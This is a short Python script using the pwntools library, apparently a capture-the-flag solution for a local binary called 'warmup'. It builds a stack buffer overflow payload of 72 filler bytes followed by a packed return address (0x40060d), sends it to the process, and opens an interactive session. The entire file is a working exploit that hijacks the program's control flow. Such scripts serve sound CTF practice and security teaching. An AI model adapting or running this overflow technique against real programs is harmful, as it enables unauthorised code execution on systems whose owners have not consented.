#!/usr/bin/env python

from pwn import *

#overwrite is 72

conn  = process('./warmup')

payload = ''
payload += "A"*72
payload += p64(0x40060d)

conn.sendline(payload)
conn.interactive()
